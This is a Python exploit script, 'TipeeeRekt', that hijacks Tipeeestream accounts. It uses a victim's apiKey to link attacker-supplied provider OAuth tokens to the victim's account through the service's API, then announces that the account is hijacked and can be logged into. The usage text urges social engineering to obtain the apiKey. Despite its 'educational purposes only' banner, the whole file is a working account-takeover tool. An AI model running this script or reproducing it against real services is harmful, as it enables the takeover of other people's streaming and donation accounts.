import requests
import colored
import sys
import json

############################
##### TipeeeRekt  V1.0 #####
############################
#### by Proxex (GitHub) ####
# Exploit by Garkolym (YT) #
############################
# For educational purposes #
########## only!! ##########
############################

debug = 1

print("")
print(colored.fg("dark_red_2"))
print('▄▄▄█████▓ ██▓ ██▓███  ▓█████ ▓█████ ▓█████     ██▀███  ▓█████  ██ ▄█▀▄▄▄█████▓', colored.fg("dark_red_2"))
print('▓  ██▒ ▓▒▓██▒▓██░  ██▒▓█   ▀ ▓█   ▀ ▓█   ▀    ▓██ ▒ ██▒▓█   ▀  ██▄█▒ ▓  ██▒ ▓▒', colored.fg("dark_red_2"))
print('▒ ▓██░ ▒░▒██▒▓██░ ██▓▒▒███   ▒███   ▒███      ▓██ ░▄█ ▒▒███   ▓███▄░ ▒ ▓██░ ▒░', colored.fg("dark_red_2"))
print('░ ▓██▓ ░ ░██░▒██▄█▓▒ ▒▒▓█  ▄ ▒▓█  ▄ ▒▓█  ▄    ▒██▀▀█▄  ▒▓█  ▄ ▓██ █▄ ░ ▓██▓ ░ ', colored.fg("dark_red_2"))
print('  ▒██▒ ░ ░██░▒██▒ ░  ░░▒████▒░▒████▒░▒████▒   ░██▓ ▒██▒░▒████▒▒██▒ █▄  ▒██▒ ░ .py', colored.fg("dark_red_2"))
print('  ▒ ░░   ░▓  ▒▓▒░ ░  ░░░ ▒░ ░░░ ▒░ ░░░ ▒░ ░   ░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▒ ▓▒  ▒ ░░   ', colored.fg("dark_red_2"))
print('    ░     ▒ ░░▒ ░      ░ ░  ░ ░ ░  ░ ░ ░  ░     ░▒ ░ ▒░ ░ ░  ░░ ░▒ ▒░    ░    ', colored.fg("dark_red_2"))
print('  ░       ▒ ░░░          ░      ░      ░        ░░   ░    ░   ░ ░░ ░   ░      ', colored.fg("dark_red_2"))
print('          ░              ░  ░   ░  ░   ░  ░      ░        ░  ░░  ░            ')

print('')
print(colored.fg("cyan"), '       by Proxex (GitHub) | Bug found by Garkolym (YouTube) | V1.0')
print('')
print('', colored.fg("white"))

if len(sys.argv) < 5:
    print("Usage:    tipeeerekt.py <provider> <provider_access_token> <provider_refresh_token> <tipeee_apiKey>")
    print("Example:  tipeeerekt.py twitch 05ib44t1h2fguowevjiwiudsgusbd4z2h 05ib44t1h2fgu02387asry95okbd4z2h NWNlZWMwODcxOWFkZDo4NzY2OTKAhisuuaAWRhZGUw")
    print("          The apiKey can be found at the end of the URL of a frame or a scene. Try social engeneering! If there is no refresh_token, try '0' as token.")
    print("")
    exit()

print('[*  ] Checked arguments. OK')
print("[*  ] Hijacking...")

print("")

print('[*  ] Getting username for following actions...')
r_username = requests.get("https://api.tipeeestream.com/v1.0/me?apiKey=" + sys.argv[4])

if debug == 1:
    print("[DBG] Request: " + r_username.text)

if "authentification is required" in r_username.text:
    print("[E] Wrong apiKey! Can't get username!")
    print("")
    exit()

username_json = json.loads(r_username.text)
print('[*  ] Username: ' + username_json["username"])

print("")

print("[*  ] Linking account to Tipeeestream...")
payload = '{"provider":"' + sys.argv[1] + '","access_token":"' + sys.argv[2] + '","refresh_token":"' + sys.argv[3] + '","origin":"managementSecurity"}';

h = {
    'Content-Type': 'application/json;charset=utf-8',
    'Connection': 'close',
    'Referer': 'https://www.tipeeestream.com/dashboard/settings/security',
    }

r_link = requests.post("https://www.tipeeestream.com/v2.0/users/" + username_json["username"] + "/providers?apiKey=" + sys.argv[4], data=payload, headers=h)

if debug == 1:
    print("[DBG] Request: " + r_link.text)

if not "success" in r_link.text:
    print("[ERR] Something went wrong while linking the account. Have a look at: <provider> <provider_access_token> <provider_refresh_token>")
    print("")
    exit()

print("[*  ] Account linked!")

print(colored.fg("green"))
print("[*  ] Success! Account hijacked! You can now log into the account!", colored.fg("white"))
